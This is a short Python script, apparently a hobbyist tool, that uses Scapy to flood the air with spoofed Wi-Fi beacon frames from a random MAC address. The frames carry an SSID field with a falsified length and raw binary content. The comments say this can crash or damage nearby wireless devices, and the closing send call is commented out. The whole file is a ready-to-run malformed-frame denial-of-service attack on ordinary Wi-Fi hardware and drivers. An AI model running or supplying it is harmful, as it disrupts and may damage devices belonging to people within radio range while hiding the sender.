from scapy.all import *

# config your stuff here
iface = 'wlan0'
sender_bssid_mac = RandMAC() # used for source mac and bssid

# send raw wifi beacon frames
## USAGE:
### 	beacon_raw(<SSID>, <REPORTED SSID LENGTH IN 8 BIT BYTES>, <INTERVAL IN SECONDS>)
### 	or
### 	beacon_raw(SSID=<SSID>, reported_length=<REPORTED SSID LENGTH IN 8 BIT BYTES>, interval_seconds=<INTERVAL IN SECONDS>)
## DEFAULTS:
###  	SSID="DUMMY SSID"
### 	reported_length=255
### 	interval_seconds=0.250
def beacon_raw(SSID="DUMMY SSID", reported_length=255, interval_seconds=0.250):
	# addr1 is destination (broadcast), addr2 is the source mac, addr3 is the bssid
	dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=sender_bssid_mac, addr3=sender_bssid_mac) # set the frame settings
	beacon = Dot11Beacon() # create the  beacon
	essid = Dot11Elt(ID='SSID',info=RawVal(SSID), len=reported_length) # magic really happens here with Scapy's RawVal() function and the reported_length
	frame = RadioTap()/dot11/beacon/essid # assemble the frame
	
	print("FIRIN MY LAZORRRRRR")
	sendp(frame, iface=iface, inter=interval_seconds, loop=1) # send on loop

# this can be most any value really experimentation is needed
ssid_binary = 0b0101 # a few random bits to send as the SSID

# please be careful with this, it can crash or damage your local wifi devices
# beacon_raw(ssid_binary) # send it! USE WITH EXTREME CARE